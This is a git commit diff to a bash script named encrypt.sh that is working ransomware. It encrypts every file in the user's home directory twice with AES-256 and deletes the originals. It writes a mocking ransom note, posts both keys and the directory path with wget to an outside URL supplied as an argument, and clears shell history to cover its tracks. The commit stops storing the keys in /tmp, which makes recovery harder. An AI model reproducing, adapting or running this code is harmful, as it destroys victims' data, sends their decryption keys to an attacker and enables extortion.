ea4bb473b5082169aacd218c9e75467361b73fb1
Drigg3r <drigg3r@yandex.com>
2017-06-22 18:22:56 -0500

    Update encrypt.sh

--- encrypt.sh
+++ encrypt.sh
@@ -1,31 +1,20 @@
 #!/bin/bash
 
-if [ -f /tmp/AesKey1.txt ]; then
-m=`cat /tmp/AesKey1.txt`
-else 
 m=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
-echo "$m" > /tmp/AesKey1.txt
-fi
-
-if [ -f /tmp/AesKey2.txt ]; then
-n=`cat /tmp/AesKey2.txt`
-else 
 n=`tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1`
-echo "$n" > /tmp/AesKey2.txt
-fi
 
 encfile()
 {
-f=$1
-if [[ "$f" != *".aes"* ]]; then 
-openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $m
-rm $f
-fi
-p="$1.aes"
-if [[ ( "$p" == *".aes"* ) && ( "$p" != *".aes.aes"* ) ]]; then
-openssl aes-256-cbc -a -salt -in $p -out $p.aes -k $n
-rm $p
-fi
+	f=$1
+	if [[ "$f" != *".aes"* ]]; then 
+	openssl aes-256-cbc -a -salt -in $f -out $f.aes -k $m
+	rm $f
+	fi
+	p="$1.aes"
+	if [[ ( "$p" == *".aes"* ) && ( "$p" != *".aes.aes"* ) ]]; then
+	openssl aes-256-cbc -a -salt -in $p -out $p.aes -k $n
+	rm $p
+	fi
 }
 
 encdir()
@@ -40,13 +29,10 @@ encdir()
 	done
 }
 
-m=`echo ~/`
-encdir "$m" > /dev/null 2>&1
+p=`echo ~/`
+encdir "$p" > /dev/null 2>&1
 echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
-l=`cat /tmp/AesKey1.txt`
-m=`cat /tmp/AesKey2.txt`
-hd=`echo ~/`
-wget --post-data "dir=$hd&Key1=$l&key2=$m" $1 > /dev/null 2>&1
+wget --post-data "dir=$p&Key1=$m&key2=$n" $1 > /dev/null 2>&1
 history -c > /dev/null 2>&1
 history -w > /dev/null 2>&1
 rm post.php
